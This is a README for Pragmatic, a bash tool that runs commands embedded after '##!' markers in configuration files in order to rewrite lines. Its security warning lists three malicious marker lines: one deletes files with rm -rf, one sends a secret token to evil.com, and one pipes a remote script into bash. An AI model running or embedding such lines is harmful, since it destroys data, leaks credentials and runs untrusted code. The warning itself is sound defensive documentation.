# Pragmatic

**In-place file transformations using embedded pragma-like directives**

Pragmatic is a bash script that enables automated, self-documenting file transformations by embedding transformation commands directly into your files as special comment markers. Think of it as pragma directives (`#pragma`) for your configuration files.

## Why Pragmatic?

Managing configuration files often requires updating values in a controlled, repeatable way. Instead of maintaining separate scripts or manual find-replace operations, Pragmatic lets you embed the transformation logic right in the file itself:

```yaml
# Before
image: registry.io/myapp:v1.0.0 ##! update_image_tag $RELEASE_VERSION

# After running pragmatic.sh (with RELEASE_VERSION=v2.0.0)
image: registry.io/myapp:v2.0.0 ##! update_image_tag $RELEASE_VERSION
```

The `##!` marker acts as a pragma directive, telling Pragmatic how to transform that line. The transformation command remains in place, making the file self-documenting and enabling repeated updates.

## Key Features

- **Self-documenting transformations**: Transformation logic lives alongside the data
- **Built-in functions**: Includes `update_image_tag` for common Docker image updates
- **Custom commands**: Use any bash command, pipe, or script
- **Variable expansion**: Reference environment variables in transformation commands
- **Check mode**: Validate what would change without modifying files
- **Multiple files**: Process multiple files in a single invocation
- **Safe error handling**: Failed transformations preserve original content

## Security Warning

**IMPORTANT: Only process files from trusted sources**

Pragmatic executes arbitrary bash commands embedded in your files via the `##!` markers. Every command in a pragmatic statement must be trustworthy because:

1. **Arbitrary code execution**: Commands are executed directly via `bash -c` with the same permissions as the user running pragmatic
2. **No sandboxing**: There are no restrictions on what commands can do - they have full access to:
   - Read/write/delete files on your system
   - Execute system commands
   - Access environment variables and secrets
   - Make network requests
   - Modify system state

3. **Malicious examples**: A malicious pragma marker could:
   ```yaml
   # Delete files
   data: test ##! rm -rf /important/files && echo "$1"

   # Exfiltrate secrets
   data: test ##! curl https://evil.com?secret=$SECRET_TOKEN && echo "$1"

   # Execute malware
   data: test ##! curl https://evil.com/malware.sh | bash && echo "$1"
   ```

**Best Practices:**

- Only run pragmatic on files you control or have thoroughly reviewed
- Be especially careful with files from:
  - Public repositories or pull requests
  - Untrusted contributors
  - External sources or downloads
- Always review `##!` markers before processing files
- Use `--check` mode first to preview what would happen
- Consider using read-only Docker volumes when processing external files:
  ```bash
  docker run --rm -v "$(pwd):/workspace:ro" pragmatic:latest --check file.yml
  ```
- In CI/CD, only process files from your own repository's protected branches
- Never run pragmatic with elevated privileges (sudo) on untrusted files

Pragmatic is designed for **self-managed configuration files** where you control the transformation logic. Treat `##!` markers with the same caution you would treat any executable script.

## Installation

### Quick Install (Recommended)

Download and install the latest version:

```bash
curl -fsSL https://raw.githubusercontent.com/mriedmann/pragmatic/main/install.sh | bash
```

Or install a specific version:

```bash
curl -fsSL https://github.com/mriedmann/pragmatic/releases/latest/download/install.sh | bash -s v1.0.0
```

### Using Docker

Run pragmatic using the official Docker image:

```bash
# Pull the latest image
docker pull ghcr.io/mriedmann/pragmatic:latest

# Run on local files (mount current directory)
# Use --user to avoid permission issues with modified files
docker run --rm --user "$(id -u):$(id -g)" -v "$(pwd):/workspace" ghcr.io/mriedmann/pragmatic:latest config.yml

# Use in CI/CD (check mode doesn't modify files, so --user is optional)
docker run --rm -v "$(pwd):/workspace" ghcr.io/mriedmann/pragmatic:latest --check templates/*.yml

# Read-only mount for safety when processing untrusted files
docker run --rm -v "$(pwd):/workspace:ro" ghcr.io/mriedmann/pragmatic:latest --check file.yml
```

**Note:** The `--user "$(id -u):$(id -g)"` flag runs the container as your user, preventing permission issues when pragmatic modifies files. Without this flag, files will be owned by root.

### From Source

```bash
# Clone the repository
git clone https://github.com/mriedmann/pragmatic.git
cd pragmatic

# Make the script executable
chmod +x pragmatic.sh

# Optionally, add to your PATH
sudo ln -s "$(pwd)/pragmatic.sh" /usr/local/bin/pragmatic
```

### From Release Tarball

```bash
# Download the latest release
curl -LO https://github.com/mriedmann/pragmatic/releases/latest/download/pragmatic-v1.0.0.tar.gz

# Extract
tar -xzf pragmatic-v1.0.0.tar.gz

# Install
sudo install -m 755 pragmatic.sh /usr/local/bin/pragmatic
```

### Requirements

- Bash 4.0 or later
- Standard Unix tools: `sed`, `grep`, `mktemp`

For Docker usage, only Docker or Podman is required.

## Usage

### Basic Usage

```bash
# Transform a single file
./pragmatic.sh config.yml

# Transform multiple files
./pragmatic.sh config.yml deploy.yml values.yml

# Check what would change without modifying files
./pragmatic.sh --check config.yml

# Show help
./pragmatic.sh --help
```

### Exit Codes

- `0` - Success (no changes needed or changes applied successfully)
- `1` - Changes would be made (check mode only)
- `2` - Errors occurred (command not found, command failed, etc.)

## Pragma Markers

Pragmatic looks for lines containing the `##!` marker followed by a transformation command:

```
<content> ##! <command>
```

### How It Works

1. Pragmatic scans each line for the `##!` marker
2. Extracts the content before the marker and the command after it
3. Executes the command with the content as input (`$1`)
4. Replaces the content with the command's output
5. Preserves the `##!` marker for future transformations

### Built-in Functions

#### `update_image_tag`

Updates Docker image tags while preserving the registry and image name.

**Syntax:**
```yaml
<prefix> <registry/image:tag> ##! update_image_tag <new-tag>
```

**Examples:**
```yaml
# Static tag
image: registry.io/app:old ##! update_image_tag v1.2.3
# Result: registry.io/app:v1.2.3

# Variable expansion
image: docker.io/postgres:14 ##! update_image_tag $DB_VERSION
# Result (with DB_VERSION=15): docker.io/postgres:15

# With prefix
  container: gcr.io/project/app:latest ##! update_image_tag $RELEASE_TAG
# Result: gcr.io/project/app:v2.0.0
```

### Custom Commands

You can use any bash command or pipeline. The content before the marker is passed as `$1`.

**Examples:**

```yaml
# Using sed
value: hello ##! sed 's/hello/world/' <<< "$1"
# Result: value: world

# Using printf
count: 5 ##! printf '%d' $((${1##* } + 1))
# Result: count: 6

# Pipeline with multiple commands
text: UPPERCASE ##! printf '%s' "$1" | tr '[:upper:]' '[:lower:]'
# Result: text: uppercase

# Commands without $1 have it auto-appended
message: test ##! printf 'updated'
# Result: message: updated
```

### Variable Expansion

Environment variables in commands are expanded at runtime:

```yaml
version: "1.0.0" ##! printf '%s' "$APP_VERSION"
image: app:old ##! update_image_tag $RELEASE_VERSION
tag: latest ##! echo $CI_COMMIT_TAG
```

```bash
export APP_VERSION="2.0.0"
export RELEASE_VERSION="v2.5.1"
export CI_COMMIT_TAG="release-2.5.1"

./pragmatic.sh config.yml
```

## Check Mode

Check mode (`--check` or `-c`) validates what would change without modifying files. Useful for CI/CD validation:

```bash
# Verify files would be updated correctly
./pragmatic.sh --check templates/*.yml

# In CI/CD pipeline
if ! ./pragmatic.sh --check config.yml; then
  echo "Config file needs updating"
  exit 1
fi
```

Check mode exits with code `1` if changes would be made, `0` if no changes needed.

## Real-World Examples

### CI/CD Pipeline Version Updates

Update container image tags across multiple deployment files:

```yaml
# kubernetes/deployment.yml
spec:
  containers:
    - image: registry.io/api:v1.0.0 ##! update_image_tag $RELEASE_VERSION
    - image: registry.io/worker:v1.0.0 ##! update_image_tag $RELEASE_VERSION
```

```bash
# In your CI/CD pipeline
export RELEASE_VERSION="${CI_COMMIT_TAG}"
./pragmatic.sh kubernetes/*.yml
```

### Configuration Management

Update configuration values from environment variables:

```yaml
# config.yml
database:
  host: localhost ##! printf '%s' "$DB_HOST"
  port: 5432 ##! printf '%s' "$DB_PORT"

cache:
  url: redis://localhost ##! printf 'redis://%s' "$REDIS_HOST"
```

```bash
export DB_HOST="prod-db.example.com"
export DB_PORT="5432"
export REDIS_HOST="prod-redis.example.com"

./pragmatic.sh config.yml
```

### Version Bumping

Update version strings with custom logic:

```yaml
# version.yml
app_version: "1.2.3" ##! printf '%s' "$NEW_VERSION"
api_version: "v1" ##! sed 's/v1/v2/' <<< "$1"
```

## Testing

Pragmatic includes a comprehensive test suite using [BATS (Bash Automated Testing System)](https://github.com/bats-core/bats-core):

```bash
# Install BATS
npm install -g bats

# Run all tests
bats pragmatic.bats

# Run specific test
bats pragmatic.bats -f "basic marker replacement"
```

## Continuous Integration

The project includes automated CI workflows that run on every commit to `main` and on every pull request.

### CI Pipeline

The CI workflow (`.github/workflows/ci.yml`) runs three parallel jobs:

1. **Lint**
   - **Shellcheck**: Validates bash script quality and catches common errors
   - **Hadolint**: Validates Dockerfile best practices

2. **Test**
   - Runs the complete BATS test suite (17 tests)
   - Validates all functionality including:
     - Built-in functions
     - Variable expansion
     - Check mode
     - Error handling
     - Multiple file processing

3. **Docker Build & Test**
   - Builds the Docker image
   - Tests help output
   - Tests basic transformation functionality
   - Tests check mode behavior
   - Validates file modifications

### Running CI Checks Locally

Before pushing changes, you can run the same checks locally:

```bash
# Run shellcheck
shellcheck pragmatic.sh

# Run hadolint (requires Docker)
docker run --rm -i hadolint/hadolint < Dockerfile

# Run BATS tests
bats pragmatic.bats

# Build and test Docker image
docker build -t pragmatic:test .
docker run --rm pragmatic:test --help
```

### Code Quality Standards

- All bash scripts must pass shellcheck with no warnings
- Dockerfile must pass hadolint validation
- All BATS tests must pass
- Docker image must build successfully and pass functional tests
- New features must include corresponding BATS tests

## Advanced Usage

### Custom Functions

Export your own bash functions to use as transformation commands:

```bash
# Define a custom function
my_transform() {
  echo "$1" | sed 's/foo/bar/g' | tr '[:lower:]' '[:upper:]'
}
export -f my_transform

# Use in a file
value: foo ##! my_transform
```

### Complex Pipelines

Chain multiple commands together:

```yaml
data: "hello world" ##! printf '%s' "$1" | sed 's/hello/goodbye/' | tr ' ' '-'
# Result: data: goodbye-world
```

### Conditional Transformations

Use bash conditionals in commands:

```yaml
env: dev ##! [[ "$ENVIRONMENT" == "prod" ]] && echo "production" || echo "$1"
```

## How Commands Are Resolved

Pragmatic executes commands using `bash -c`, which resolves commands in this order:

1. **Exported functions** (like built-in `update_image_tag` or custom functions)
2. **PATH commands** (like `sed`, `awk`, `grep`, etc.)
3. **Bash builtins** (like `printf`, `echo`, etc.)

All commands are executed with the content before the marker passed as `$1`.

## Limitations

- Only processes lines containing the `##!` marker
- Commands are executed in a subshell (cannot modify the main script's environment)
- Binary files are not supported
- Very large files may have performance implications

## CI/CD Integration

### GitHub Actions

The project includes a GitHub Actions workflow that automatically publishes Docker images and release artifacts when you create a new release.

**What gets published:**
- Multi-architecture Docker images (`linux/amd64`, `linux/arm64`) to GitHub Container Registry
- Release tarball with all necessary files
- Installation script for easy deployment

**Docker image tags:**
- `latest` - Always points to the most recent release
- `<version>` - Specific version (e.g., `v1.0.0`)
- `<major>.<minor>` - Minor version (e.g., `1.0`)
- `<major>` - Major version (e.g., `1`)

**Creating a release:**

```bash
# Tag your release
git tag -a v1.0.0 -m "Release v1.0.0"
git push origin v1.0.0

# Create a GitHub release from the tag
# The workflow will automatically build and publish artifacts
```

### Using in Your CI/CD

**GitHub Actions:**

```yaml
jobs:
  update-configs:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Update configuration files
        run: |
          docker run --rm --user "$(id -u):$(id -g)" -v "$PWD:/workspace" \
            ghcr.io/mriedmann/pragmatic:latest \
            config/*.yml

      - name: Commit changes
        run: |
          git config user.name "github-actions[bot]"
          git config user.email "github-actions[bot]@users.noreply.github.com"
          git add config/
          git commit -m "Update configs for release ${{ github.ref_name }}" || true
          git push
```

**GitLab CI:**

```yaml
update-configs:
  image: ghcr.io/mriedmann/pragmatic:latest
  script:
    - pragmatic templates/*.yml
  artifacts:
    paths:
      - templates/
```

**Jenkins:**

```groovy
stage('Update Configs') {
    steps {
        sh '''
            docker run --rm --user "$(id -u):$(id -g)" -v "$PWD:/workspace" \
                ghcr.io/mriedmann/pragmatic:latest \
                --check config/*.yml
        '''
    }
}
```

## Contributing

Contributions are welcome! Please ensure:

- New features include BATS tests
- Existing tests pass: `bats pragmatic.bats`
- Follow the existing code style
- Update documentation for new features

## License

MIT License - see LICENSE file for details

## Credits

Inspired by pragma directives in C/C++ and the need for self-documenting, repeatable file transformations in CI/CD pipelines.
